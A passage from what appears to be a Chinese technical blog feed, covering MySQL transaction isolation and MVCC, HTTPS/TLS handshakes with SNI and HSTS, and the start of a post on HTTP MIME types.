id="事务并发问题"><a href="#事务并发问题" class="headerlink" title="事务并发问题"></a>事务并发问题</h2><p>当数据库上有多个事务同时执行时，如果没有采取必要的隔离机制，就可能出现各种并发问题，常见的有：脏读、幻读、不可重复读和两类丢失更新。</p><p><strong>脏读（Dirty Read，读取未提交数据）</strong></p><p>脏读是指在一个事务在执行过程中读取了另一个事务未提交的数据。例如：A 向 B 转账 100 元（事务 A 未提交），B 查看账户发现钱已到账（事务 B 读取），事务 A 发生异常回滚，B 之后查看账户发现钱其实并没有转（事务 B 进行了一次脏读）。</p><p><strong>不可重复读（Non-Repeatable Read，前后多次读取，数据内容不一致）</strong></p><p>不可重复读是指一个事务在执行过程中，有另一个事务对数据进行了 <strong>修改</strong>，导致第一个事务两次读取到的数据不一致。例如：事务 A 读取某一数据，同时事务 B 也修改了这个数据并向数据库提交，事务 A 再次读取该数据就得到了不同的结果，发生了不可重复读。</p><p><strong>幻读（Phantom Read，前后多次读取，数据总量不一致）</strong></p><p>幻读是指一个事务在执行过程中，有另一个事务 <strong>插入</strong> 了某行数据，导致第一个事务两次读取结果不同。例如：事务 A 按某一条件读表中数据，同时事务 B 插入了满足查询条件的新数据，事务 A 再按照相同的查询条件检索，就会发现两次获得的数据不一样。</p><p><strong>第一类丢失更新（Lost Update，回滚丢失）</strong></p><p>事务 A 回滚时，把已经提交的事务 B 的更新数据覆盖了。</p><table><thead><tr><th>时间</th><th>取款事务A</th><th>转账事务B</th></tr></thead><tbody><tr><td>T1</td><td><strong>开始事务</strong></td><td></td></tr><tr><td>T2</td><td></td><td><strong>开始事务</strong></td></tr><tr><td>T3</td><td>查询账户余额为1000元</td><td></td></tr><tr><td>T4</td><td></td><td>查询账户余额为1000元</td></tr><tr><td>T5</td><td></td><td>汇入100元把余额改为1100元</td></tr><tr><td>T6</td><td></td><td><strong>提交事务</strong></td></tr><tr><td>T7</td><td>取出100元把余额改为900元</td><td></td></tr><tr><td>T8</td><td><strong>回滚事务</strong></td><td></td></tr><tr><td>T9</td><td><strong>余额恢复为1000元（丢失更新）</strong></td><td></td></tr></tbody></table><p>注：ANSI/ISO SQL92 标准没有定义这种现象，标准定义的所有隔离级别都不允许第一类丢失更新发生。</p><p><strong>第二类丢失更新（Second Lost Update，覆盖丢失/两次更新问题）</strong></p><p>事务 A 覆盖事务 B 已经提交的数据，造成事务 B 所做的操作丢失。</p><table><thead><tr><th>时间</th><th>取款事务A</th><th>转账事务B</th></tr></thead><tbody><tr><td>T1</td><td><strong>开始事务</strong></td><td></td></tr><tr><td>T2</td><td></td><td><strong>开始事务</strong></td></tr><tr><td>T3</td><td>查询账户余额为1000元</td><td></td></tr><tr><td>T4</td><td></td><td>查询账户余额为1000元</td></tr><tr><td>T5</td><td>取出100元把余额改为900元</td><td></td></tr><tr><td>T6</td><td><strong>提交事务</strong></td><td></td></tr><tr><td>T7</td><td></td><td>汇入100元</td></tr><tr><td>T8</td><td></td><td><strong>提交事务</strong></td></tr><tr><td>T9</td><td></td><td><strong>把余额改为1100元（丢失更新）</strong></td></tr></tbody></table><p>解决方案：乐观锁、悲观锁。</p><p><strong>小结</strong></p><ul><li>脏读是当前事务读取了另一个 <strong>未提交</strong> 的事务中的数据，幻读和不可重复读是当前事务读取了另一个 <strong>已经提交</strong> 的事务中的数据；</li><li>不可重复读的重点是修改：同样的条件，第 1 次和第 2 次读出来的 <strong>值</strong> 不一样；</li><li>幻读的重点在于新增或者删除：同样的条件，第 1 次和第 2 次读出来的 <strong>记录数</strong> 不一样；</li><li>脏读、不可重复读、幻读三个问题都是一个事务对数据修改，另一个事务总是在执行读操作<strong>（读 – 写）</strong>，而丢失更新出现的场景是两事务都在对数据进行修改<strong>（写 – 写）</strong>。</li></ul><h2 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h2><p>为了解决 <strong>读写冲突</strong> 的问题，在数据库中实现了不同的 <strong>事务隔离级别</strong>，只要设置了会话的事务隔离级别，数据库在分析事务中的 SQL 语句时就会自动选择适当的操作。</p><p>SQL92 标准定义了 4 个等级的事务隔离级别：</p><ul><li>读未提交（Read Uncommitted，RU）：一个事务还没提交时，它做的变更就能被别的事务看到。</li><li>读已提交（Read Committed，RC）：一个事务提交之后，它做的变更才会被其他事务看到。</li><li>可重复读（Repeatable Read，RR）：一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的。</li><li>串行化（Serializable）：对于同一行记录，“写” 会加 “写锁”，“读” 会加 “读锁”。当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。</li></ul><p>下面来看一个例子，假设数据表 T 中只有一列，其中第一行的值为 1，按照时间顺序执行 A、B 两个事务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs mysql">mysql&gt; create table T(c int) engine=InnoDB;<br>mysql&gt; insert into T(c) values(1);<br></code></pre></td></tr></table></figure><table><thead><tr><th>时间</th><th>事务A</th><th>事务B</th></tr></thead><tbody><tr><td>T1</td><td><strong>开始事务</strong></td><td></td></tr><tr><td>T2</td><td></td><td><strong>开始事务</strong></td></tr><tr><td>T3</td><td>查询得到值1</td><td></td></tr><tr><td>T4</td><td></td><td>查询得到值1</td></tr><tr><td>T5</td><td></td><td>将1改成2</td></tr><tr><td>T6</td><td>查询得到值V1</td><td></td></tr><tr><td>T7</td><td></td><td><strong>提交事务</strong></td></tr><tr><td>T8</td><td>查询得到值V2</td><td></td></tr><tr><td>T9</td><td><strong>提交事务</strong></td><td></td></tr><tr><td>T10</td><td>查询得到值V3</td><td></td></tr></tbody></table><p>在不同的隔离级别下，事务 A 的返回结果，也就是图中 V1、V2、V3 的返回值如下：</p><table><thead><tr><th>隔离级别</th><th>V1</th><th>V2</th><th>V3</th><th>说明</th></tr></thead><tbody><tr><td>Read Uncommitted</td><td>2</td><td>2</td><td>2</td><td>事务 B 虽然还没有提交，但是结果已经被 A 看到了。</td></tr><tr><td>Read Committed</td><td>1</td><td>2</td><td>2</td><td>事务 B 的更新在提交后才能被 A 看到。</td></tr><tr><td>Repeatable Read</td><td>1</td><td>1</td><td>2</td><td>事务在执行期间看到的数据前后必须是一致的。</td></tr><tr><td>Serializable</td><td>1</td><td>1</td><td>2</td><td>事务 B 执行修改操作时，会被锁住。直到事务 A 提交后，事务 B 才可以继续执行。</td></tr></tbody></table><p>在实现上，其实数据库内部会创建一个 <strong>读视图（Read View）</strong>，访问的时候以视图的逻辑结果为准。在 “可重复读” 隔离级别下，这个视图是在 <strong>每个事务启动时</strong> 创建的，整个事务存在期间都用这个视图。在 “读提交” 隔离级别下，<strong>每个语句开始执行时</strong> 都会重新获取并生成新的读视图。这里需要注意的是，在 “读未提交” 隔离级别下会直接返回记录上的最新值，<strong>没有视图概念</strong>；而 “串行化” 隔离级别下直接用 <strong>加锁</strong> 的方式来避免并行访问，但执行效率低下，一般不使用。</p><p>不同的隔离级别对并发问题的解决情况如下：</p><table><thead><tr><th>隔离级别</th><th align="center">脏读</th><th align="center">不可重复读</th><th align="center">幻读</th><th align="center">第一类丢失更新</th><th align="center">第二类丢失更新</th></tr></thead><tbody><tr><td>Read Uncommitted</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">×</td><td align="center">√</td></tr><tr><td>Read Committed</td><td align="center">×</td><td align="center">√</td><td align="center">√</td><td align="center">×</td><td align="center">√</td></tr><tr><td>Repeatable Read</td><td align="center">×</td><td align="center">×</td><td align="center">√</td><td align="center">×</td><td align="center">√</td></tr><tr><td>Serializable</td><td align="center">×</td><td align="center">×</td><td align="center">×</td><td align="center">×</td><td align="center">×</td></tr></tbody></table><blockquote><p>在 MySQL 中默认的隔离级别为 Repeatable Read (可重复读)。</p></blockquote><p><strong>注意：事务的隔离级别和数据库并发性是成反比的，隔离级别越高，并发性越低，执行效率越低。</strong></p><h2 id="多版本并发控制"><a href="#多版本并发控制" class="headerlink" title="多版本并发控制"></a>多版本并发控制</h2><p>数据库实现事务隔离的方式，基本可以分为以下两种。一种是在操作数据前，对其加锁，阻止其他事务对数据进行修改；另一种是不加任何锁，通过一定机制生成一个数据请求时间点的一致性数据快照，并用这个快照来提供一定级别（语句级或事务级）的 <strong>一致性读取</strong>。后面这种技术叫做 **MVCC（Multi-Version Concurrency Control，多版本并发控制)**，也经常被称为多版本数据库。</p><blockquote><p>注：MVCC 只在 Read Commited 和 Repeatable Read 两种隔离级别下工作。</p></blockquote><p>在 MVCC 并发控制中，读操作可以分成两类：</p><ul><li><strong>快照读（Snapshot Read）：</strong>简单的 select 操作，不需要加锁，读取的是记录的可见版本（有可能是历史版本）；</li><li><strong>当前读（Current Read）：</strong>特殊的读操作，读取的是记录提交完成的最新版本，并且会对返回的记录加锁，比如 <code> insert/update/delete</code>、<code>select ...for update</code>、<code>select ... lock in share mode</code> 都属于当前读。</li></ul><p>上一节提到的 <strong>读视图（Read View）</strong>就是事务进行 <strong>快照读</strong> 时产生的当前数据库的一个快照，主要用来做可见性判断，即用它来判断当前事务能够看到哪个版本的数据。这既可能是当前最新的数据，也有可能是通过 undo log 计算得到的某个版本的数据。</p><p>在具体实现上，InnoDB 的每个事务都有一个严格递增且唯一的事务 ID，记作 trx_id。数据表中的每行记录有多个数据版本，每个版本有自己的 row trx_id。每次更新数据的时候，都会生成一个新的数据版本，并且把当前 trx_id 赋值给 row trx_id。同时，将每一次改变的 row trx_id 保留下来，这样在后面的数据版本中，能够有足够的信息来构建之前的版本记录。</p><p>下面举一个例子说明，事务隔离级别为 RR，初始建表语句和事务执行顺序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE `t` (<br>    `id` int(11) NOT NULL,<br>    `k` int(11) DEFAULT NULL,<br>    PRIMARY KEY (`id`)<br>) ENGINE=InnoDB;<br>insert into t(id, k) values(1,1);<br></code></pre></td></tr></table></figure><table><thead><tr><th>时间</th><th>事务A</th><th>事务B</th><th>事务C</th></tr></thead><tbody><tr><td>T1</td><td>start transaction with consistent snapshot;</td><td></td><td></td></tr><tr><td>T2</td><td></td><td>start transaction with consistent snapshot;</td><td></td></tr><tr><td>T3</td><td></td><td></td><td>update t set k=k+1 where id=1;</td></tr><tr><td>T4</td><td></td><td>update t set k=k+1 where id=1;</td><td></td></tr><tr><td>T5</td><td></td><td>select k as k1 from t where id=1;</td><td></td></tr><tr><td>T6</td><td>select k as k2 from t where id=1;</td><td></td><td></td></tr><tr><td>T7</td><td></td><td>commit;</td><td></td></tr><tr><td>T8</td><td>select k as k3 from t where id=1;</td><td></td><td></td></tr><tr><td>T9</td><td>commit;</td><td></td><td></td></tr></tbody></table><p>最后的执行结果为：k1 =&gt; 3、k2 =&gt; 1、k3 =&gt; 1。</p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>MySQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
      <tag>事务</tag>
      
      <tag>InnoDB</tag>
      
      <tag>MVCC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>透视 HTTP 协议（三）</title>
    <link href="/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS-和-SSL-TLS"><a href="#HTTPS-和-SSL-TLS" class="headerlink" title="HTTPS 和 SSL/TLS"></a>HTTPS 和 SSL/TLS</h2><p>HTTP 协议有两个缺点：<strong>明文</strong> 和 <strong>不安全</strong>，仅凭 HTTP 自身是无力解决的，需要引入新的 HTTPS 协议。</p><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS 其实是一个 “非常简单” 的协议，除了在 RFC 文档中规定了 <strong>新的协议名 HTTPS，默认端口号 443</strong>，其他的部分都完全沿用 HTTP，没有任何新的东西。</p><p>实际上，HTTPS 的安全特性在于把 HTTP 下层的传输协议由 TCP/IP 换成了 SSL/TLS，由 <strong>HTTP over TCP/IP</strong> 变成了 <strong>HTTP over SSL/TLS</strong>，让 HTTP 运行在了安全的 SSL/TLS 协议上，收发报文不再使用 Socket API，而是调用专门的安全接口。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/50d57e18813e18270747806d5d73f0a3.png"></p><h3 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h3><p>SSL 即 <strong>安全套接层（Secure Sockets Layer）</strong>，在 OSI 模型中处于第 5 层（会话层），由网景公司于 1994 年发明，有 v2 和 v3 两个版本，而 v1 因为有严重的缺陷从未公开过。</p><p>SSL 发展到 v3 时已经证明了它自身是一个非常好的安全通信协议，于是互联网工程组 IETF 在 1999 年把它正式标准化，改名为 TLS，即 <strong>传输层安全（Transport Layer Security）</strong>，版本号从 1.0 重新算起，所以 TLSv1.0 实际上就是 SSLv3.1。</p><p>到今天 TLS 已经发展出了三个版本，分别是 2006 年的 v1.1、2008 年的 v1.2 和 2018 年的 v1.3，每个新版本都紧跟密码学的发展和互联网的现状，持续强化安全和性能，已经成为了信息安全领域中的权威标准，目前应用的最广泛的 <strong>TLSv1.2</strong>。 </p><p>TLS 由记录协议（Record Protocol）、警告协议（Alert Protocol）、握手协议（Handshake Protocol）、变更密码规范协议（Change Cipher Spec Protocol）、扩展协议等几个子协议组成，综合使用了对称加密、非对称加密、身份认证等许多密码学前沿技术。</p><p>浏览器和服务器在使用 TLS 建立连接时需要选择一组恰当的加密算法来实现安全通信，这些算法的组合被称为 <strong>密码套件（cipher suite）</strong>。TLSv1.2 的密码套件命名格式为：<strong>密钥交换算法 - 签名算法 - 对称加密算法 - 摘要算法</strong>，比如：<code>ECDHE-RSA-AES256-GCM-SHA384</code>。</p><blockquote><p>除了 HTTP =&gt; HTTPS，SSL/TLS 也可以承载其他应用协议，例如 FTP =&gt; FTPS，LDAP =&gt; LDAPS。</p></blockquote><h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>OpenSSL 是一个著名的开源密码学程序库和工具包，几乎支持所有公开的加密算法和协议，已经成为了事实上的标准，许多应用软件都会使用它作为底层库来实现 TLS 功能，包括常用的 Web 服务器 Apache、Nginx 等。</p><p>由于 OpenSSL 是开源的，所以它还有一些代码分支，比如 Google 的 BoringSSL、OpenBSD 的 LibreSSL，这些分支在 OpenSSL 的基础上删除了一些老旧代码，也增加了一些新特性，虽然背后有 “大金主”，但离取代 OpenSSL 还差得很远。</p><blockquote><p>OpenSSL 是从另一个开源库 SSLeay 发展出来的，曾经考虑命名为 OpenTLS，但当时（1998 年）TLS 还未正式确立，而 SSL 早已广为人知，所以最终使用了 OpenSSL 的名字。</p></blockquote><h2 id="TLSv1-2-连接过程"><a href="#TLSv1-2-连接过程" class="headerlink" title="TLSv1.2 连接过程"></a>TLSv1.2 连接过程</h2><p>在 HTTP 协议中，通过三次握手与网站建立 TCP 连接后，浏览器会立即发送请求报文。但使用 HTTPS 协议，会先与服务器执行 TCP 握手，然后 <strong>再执行 TLS 握手建立安全连接</strong>，之后才是数据通信。这个握手过程与 TCP 有些类似，是 HTTPS 和 TLS 协议里最重要、最核心的部分。</p><p>下面的这张图简要地描述了 TLS 的握手过程，其中每一个 “框” 都是一个记录，多个记录组合成一个 TCP 包发送。所以，需要经过 2 个 RTT 完成握手，然后就可以在安全的通信环境里发送 HTTP 报文，实现 HTTPS 协议。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/69493b53f1b1d540acf886ebf021a26c.png"></p><h3 id="ECDHE-握手过程"><a href="#ECDHE-握手过程" class="headerlink" title="ECDHE 握手过程"></a>ECDHE 握手过程</h3><p>目前主流的 TLS 握手过程使用的是 ECDHE 密钥交换算法，流程如下：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/9caba6d4b527052bbe7168ed4013011e.png"></p><p>使用 ECDHE 实现密钥交换有两个特点，一是服务器端会发出 Server Key Exchange 消息，二是客户端可以不用等到服务器返回 Finished 确认握手完毕，立即就发出 HTTP 报文，即 <strong>TLS False Start</strong>。</p><p>在上述过程中，Change Cipher Spec 之前传输的都是明文，之后都是用对称密钥加密的密文，握手的目的就是安全交换通信过程中使用的对称密钥（会话密钥）。</p><h3 id="RSA-握手过程"><a href="#RSA-握手过程" class="headerlink" title="RSA 握手过程"></a>RSA 握手过程</h3><p>传统的 RSA 密钥交换中没有 Server Key Exchange 和 False Start，流程如下：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/cb9a89055eadb452b7835ba8db7c3ad2.png"></p><p>大体的流程没有变，只是 Pre-Master 不再需要用算法生成，而是客户端直接生成随机数，然后用服务器的公钥加密，通过 Client Key Exchange 消息发给服务器。服务器再用私钥解密，这样双方也实现了共享三个随机数，就可以生成主密钥。</p><p><strong>TLSv1.2 协议细节</strong></p><ul><li>在 TLSv1.2 中，客户端和服务端的随机数长度都是 28 字节，前面的 4 个字节是 unix 时间戳。</li><li>TLS 协议中原本定义有压缩方式，但后来发现存在安全漏洞（CRIME 攻击），所以现在这个字段总是 NULL，即不压缩。</li><li>对 TLSv1.2 已知的攻击有：BEAST、BREACH、CRIME、FREAK、LUCKY13、POODLE、ROBOT 等。</li></ul><h2 id="TLSv1-3-特性解析"><a href="#TLSv1-3-特性解析" class="headerlink" title="TLSv1.3 特性解析"></a>TLSv1.3 特性解析</h2><p>虽然 TLSv1.2 久经考验，但已经是 10 多年前的协议了，在安全、性能等方面已经跟不上如今的互联网了。于是经过四年、近 30 个草案的反复打磨，TLSv1.3 终于在 2018 年正式登场，再次确立了信息安全领域的新标准。</p><p>TLSv1.3 的主要改进目标有三个：<strong>兼容</strong>、<strong>安全</strong>、<strong>性能</strong>。</p><h3 id="最大化兼容性"><a href="#最大化兼容性" class="headerlink" title="最大化兼容性"></a>最大化兼容性</h3><p>由于 v1.1、v1.2 等协议已经出现了很多年，很多应用软件、中间代理只认老的记录协议格式，更新改造很困难，甚至是不可行。</p><blockquote><p>在早期的试验中发现，一旦变更了记录头字段里的版本号，也就是由 0x303（TLS1.2）改为 0x304（TLS1.3）的话，大量的代理服务器、网关都无法正确处理，最终导致 TLS 握手失败。</p></blockquote><p>为了保证这些被广泛部署的老设备能够继续使用，避免新协议带来的冲击，TLSv1.3 不得不做出妥协，保持现有的记录格式不变，通过伪装来实现兼容，使得 TLSv1.3 看上去像是 TLSv1.2。</p><p>TLSv1.3 通过 <strong>扩展字段</strong> 来增加新的功能。在记录头的 Version 字段被兼容性固定的情况下，TLS1.3 协议会在握手的 “Hello“ 消息后面添加 <strong>supported_versions</strong> 扩展，其中标记了 TLS 的版本号，使用它就能区分新旧协议。</p><h3 id="强化安全"><a href="#强化安全" class="headerlink" title="强化安全"></a>强化安全</h3><p>TLSv1.2 在十来年的应用中获得了许多宝贵的经验，发现了很多的漏洞和加密算法的弱点，所以 TLSv1.3 就在协议里修补了这些不安全因素。比如：</p><ul><li>伪随机数函数由 PRF 升级为 HKDF（HMAC-based Extract-and-Expand Key Derivation Function）；</li><li>明确禁止在记录协议里使用压缩；</li><li>废除了 RC4、DES 对称加密算法；</li><li>废除了 ECB、CBC 等传统分组模式；</li><li>废除了 MD5、SHA1、SHA-224 摘要算法；</li><li>废除了 RSA、DH 密钥交换算法和许多命名曲线。</li></ul><p>经过这一番 “减肥瘦身” 之后，TLS1.3 里只保留了 AES、ChaCha20 对称加密算法，分组模式只能用 AEAD 的 GCM、CCM 和 Poly1305，摘要算法只能用 SHA256、SHA384，密钥交换算法只有 ECDHE 和 DHE，椭圆曲线也只保留了 P-256 和 x25519 等 5 种。</p><p>算法精简后的好处是：原来众多的算法、参数组合导致密码套件非常复杂，难以选择，而现在的 TLS1.3 里只有下面 5 个套件：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/eeeb1d30acbc0e69541ce0620346b765.jpg"></p><blockquote><p>TLSv1.3 里的密码套件没有指定密钥交换算法和签名算法，可以通过扩展字段判断。</p></blockquote><p>这里还要特别说一下为什么废除了 RSA 和 DH 密钥交换算法，因为它不具备 <strong>前向安全（Forward Secrecy）</strong>。</p><p>假设有一个很有耐心的黑客，一直在长期收集混合加密系统收发的所有报文。如果加密系统使用服务器证书里的 RSA 做密钥交换，一旦私钥泄露或被破解（使用社会工程学或者超级计算机），那么黑客就能够使用私钥解密出之前所有报文的 Pre-Master，再算出会话密钥，破解所有密文。这就是所谓的 <strong>“今日截获，明日破解”</strong>。</p><p>而 ECDHE 算法在每次握手时都会生成一对临时的公钥和私钥，每次通信的密钥对都是不同的，也就是 <strong>一次一密</strong>，即使黑客花大力气破解了这一次的会话密钥，也只是这次通信被攻击，之前的历史消息不会受到影响，仍然是安全的。</p><blockquote><p>ECDHE（Elliptic Curve Diffie-Hellman Ephemeral），即 <strong>短暂-椭圆曲线-迪菲-赫尔曼算法</strong>，使用椭圆曲线增强了 DH 算法的安全性和性能，公钥和私钥都是临时生成的。</p></blockquote><h3 id="提升性能"><a href="#提升性能" class="headerlink" title="提升性能"></a>提升性能</h3><p>HTTPS 建立连接时不仅要做 TCP 握手，还要做 TLS 握手，在 v1.2 中会多花 2-RTT，可能导致几十毫秒甚至上百毫秒的延迟，在移动网络中延迟还会更严重。</p><p>现在因为密码套件大幅度简化，也就没有必要再像以前那样走复杂的协商流程了。TLS1.3 压缩了以前的 “Hello” 协商过程，删除了 Key Exchange 消息，把握手时间减少到了 <strong>1-RTT</strong>，效率提高了一倍。</p><p>在具体的实现上还是利用了扩展。客户端在 “Client Hello” 消息里直接用 <strong>supported_groups</strong> 带上支持的曲线，用 <strong>key_share</strong> 带上曲线对应的客户端公钥参数，用 <strong>signature_algorithms</strong> 带上签名算法。服务器收到消息后，在这些扩展里选定一个曲线和参数，再用 key_share 扩展返回服务器这边的公钥参数，就实现了双方的密钥交换，后面的流程就和 v1.2 基本一样了。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/4d1df4d07dbb1c2500fc4ea69ecf7ab0.png"></p><p>除了标准的 1-RTT 握手，TLS1.3 还引入了 0-RTT 握手，用 <strong>pre_shared_key</strong> 和 <strong>early_data</strong> 扩展，在 TCP 连接后立即建立安全连接发送加密消息，这种方法被称为 <strong>预共享密钥（Pre-shared Key，PSK）</strong>。</p><p>但 PSK 也不是完美的，它为了追求效率而牺牲了一点安全性，容易受到重放攻击。解决方式是在消息里加入时间戳、nonce 验证等。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/119cfd261db49550411a12b1f6d826ab.png"></p><h3 id="握手过程"><a href="#握手过程" class="headerlink" title="握手过程"></a>握手过程</h3><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/7a2bc39fdbb421cf72a01e887e9156db.png"></p><h2 id="SNI-和-HSTS"><a href="#SNI-和-HSTS" class="headerlink" title="SNI 和 HSTS"></a>SNI 和 HSTS</h2><h3 id="服务器名称指示"><a href="#服务器名称指示" class="headerlink" title="服务器名称指示"></a>服务器名称指示</h3><p>在使用 HTTPS 服务前还有一个 <strong>虚拟主机</strong> 的问题需要解决。</p><p>由于在 HTTP 协议里，多个域名可以同时在一个 IP 地址上运行（即虚拟主机），Web 服务器会使用请求头里的 Host 字段来选择。</p><p>但在 HTTPS 里，因为请求头只有在 TLS 握手之后才能发送，在握手时就必须选择 虚拟主机对应的证书，此时 TLS 无法得知域名的信息，只能用 IP 地址来区分。所以，最早的时候每个 HTTPS 域名必须使用独立的 IP 地址，非常不方便。</p><p>这个问题后来通过 <strong>server_name</strong> 扩展得以解决，支持在 TLS 协议中添加 <strong>SNI（Server Name Indication，服务器名称指示）</strong>记录。SNI 的作用和 Host 字段差不多，允许客户端在 “Client Hello” 时带上域名信息，这样服务器就可以根据名字而不是 IP 地址来选择证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">Extension: server_name (len=20)<br>    Server Name Indication extension<br>        Server Name Type: host_name (0)<br>        Server Name: www.b.com<br></code></pre></td></tr></table></figure><p>Nginx 很早就基于 SNI 特性支持了 HTTPS 的虚拟主机，在 OpenResty 里可还以编写 Lua 脚本，利用 Redis、MySQL 等数据库更快更灵活地加载证书。</p><h3 id="重定向跳转"><a href="#重定向跳转" class="headerlink" title="重定向跳转"></a>重定向跳转</h3><p>当 Web 站点迁移到 HTTPS 服务，原来的 HTTP 站点也不能马上弃用，因为还是会有很多人习惯在地址栏里直接输入域名，或者是旧的书签、超链接，默认使用 HTTP 协议访问。</p><p>解决方式很简单，使用 “重定向跳转” 技术把不安全的 HTTP 网址用 301 或 302 重定向到新的 HTTPS 网站就可以了，这在 Nginx 里也很容易做到：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://$host$request_uri;             <span class="hljs-comment"># 永久重定向</span><br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^</span>  https://$host$request_uri <span class="hljs-literal">permanent</span>;   <span class="hljs-comment"># 永久重定向</span><br></code></pre></td></tr></table></figure><p>但这种方式有两个问题。一个是重定向增加了网络成本，多出了一次请求；另一个是存在安全隐患，重定向的响应可能会被中间人窜改，实现 <strong>会话劫持</strong>，跳转到恶意网站。</p><p>使用 <strong>HSTS（HTTP Strict Transport Security，HTTP 严格传输安全）</strong>可以消除这种安全隐患。HTTPS 服务器需要在响应头中添加一个 <strong>Strict-Transport-Security</strong> 字段，再设定一个有效期，例如：<code>Strict-Transport-Security: max-age=15768000; includeSubDomains</code>。这相当于告诉浏览器：我这个网站必须严格使用 HTTPS 协议，在半年之内（182.5 天）都不允许用 HTTP。</p><p>有了 HSTS 的指示，以后浏览器再访问同样的域名时就会自动把 URI 里的 http:// 改成 https://，直接访问安全的 HTTPS 网站。这样避免了中间人攻击，而且对于客户端来说也免去了一次跳转，加快了连接速度。</p><blockquote><p>HSTS 无法防止黑客对第一次访问的攻击，所以 chrome 等浏览器还内置了一个 HSTS preload 的列表（chrome://net-internals/#hsts），只要域名在这个列表里，无论何时都会强制使用 HSTS 访问。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>HTTP</tag>
      
      <tag>HTTPS</tag>
      
      <tag>TLS</tag>
      
      <tag>SNI</tag>
      
      <tag>HSTS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>透视 HTTP 协议（二）</title>
    <link href="/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/post/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="实体结构"><a href="#实体结构" class="headerlink" title="实体结构"></a>实体结构</h2><p>一个 HTTP 报文是由 header+body 组成的，本章主要研究 HTTP 的实体结构，也就是 body 部分。</p><h3 id="数据类型与编码"><a href="#数据类型与编码" class="headerlink" title="数据类型与编码"></a>数据类型与编码</h3><p><strong>MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展）</strong>也被称为 <strong>MIME 类型</strong>，是一个很大的标准规范，最早应用于电子邮件系统，用于描述多媒体数据的类型。HTTP 协议只取了其中的一部分，用来标记 body 的数据类型。</p><blockquote><p>MIME 的组成结构非常简单，由类型与子类型两个字符串中间用 <code>/</code> 分隔而成，通用形式是 <code>type/subtype</code>。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL，因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p></blockquote><p>在 HTTP 中常见的 MIME 类型有：</p><ol><li>text：文本格式的可读数据<ul><li>text/plain：纯文本文件，文本文件默认值。</li><li>text/html：超文本文件，最常见的文本类型之一。</li><li>text/css：样式表文件。</li><li>text/javascript：JavaScript 文件。</li></ul></li><li>image：图像数据<ul><li>image/gif：GIF 图片（支持动态图）。</li><li>image/jpeg：JPEG 图片（最常用的压缩图片）。</li><li>image/png：PNG 图片（无损压缩图片）。</li><li>image/svg+xml： SVG 图片（矢量图）。</li></ul></li><li>audio/video：音频和视频数据<ul><li>audio/mpeg：mpeg 音频文件。</li><li>video/mp4：mp4 视频文件。</li></ul></li><li>application：数据格式不固定，可能是文本也可能是二进制，必须由上层应用程序来解释<ul><li>application/json：json 数据格式。</li><li>application/xml：xml 数据格式。</li><li>application/x-www-form-urlencoded：表单的标准编码格式。</li><li>application/pdf：pdf 格式。</li><li>application/octet-stream：二进制数据流，表示未知的应用程序文件，浏览器一般不会自动执行或询问执行。</li></ul></li></ol><p>但仅有 MIME 类型还不够，因为 HTTP 